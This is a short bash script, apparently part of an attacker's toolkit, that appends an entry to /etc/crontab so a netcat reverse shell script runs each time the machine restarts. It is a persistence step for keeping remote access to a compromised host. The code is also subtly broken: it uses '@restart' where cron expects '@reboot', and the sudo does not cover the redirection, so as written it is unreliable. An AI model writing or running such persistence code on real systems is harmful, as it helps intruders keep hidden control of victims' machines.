#!/bin/bash
#adds persistence.sh to crontab
sudo echo '@restart bash nohup ~/toolbag/persistence/netcatreverseshell.sh' >> /etc/crontab
